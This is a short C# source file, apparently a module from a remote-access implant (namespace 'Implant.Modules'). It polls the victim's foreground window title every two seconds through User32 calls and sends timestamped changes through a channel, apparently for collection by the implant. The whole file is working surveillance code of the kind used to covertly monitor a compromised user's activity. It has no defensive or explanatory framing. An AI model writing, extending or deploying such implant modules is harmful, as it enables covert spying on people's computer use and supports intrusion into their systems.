using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Channels;

namespace Implant.Modules {
    
    public class Wintracker {
        
        [DllImport("User32.dll")]
        internal static extern int GetForegroundWindow();

        [DllImport("User32.dll")]
        internal static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);

        public static void run(Channel<string> channel) {
            string windowName = "";
            while (true) {
                string prevWindowName = windowName;
                windowName = CurrentWindowTitle();
        
                // If retrieved name is different than the previous one
                if(windowName != prevWindowName) {
                    string res = "[" + DateTime.Now.ToString("dd/MM/yy-HH:mm:ss") + "-Window] " + windowName;
                    Console.WriteLine(res);
                    channel.Writer.WriteAsync(res);
                }
        
                Thread.Sleep(2000);
            }
        }

        // Retrieve main window name
        private static string CurrentWindowTitle()
        {
            int hwnd = GetForegroundWindow();
            StringBuilder title = new StringBuilder(200);

            int textLength = GetWindowText(hwnd, title, title.Capacity);
            if (textLength <= 0)
                return "Unknown";

            return title.ToString();
        }
        
    }
}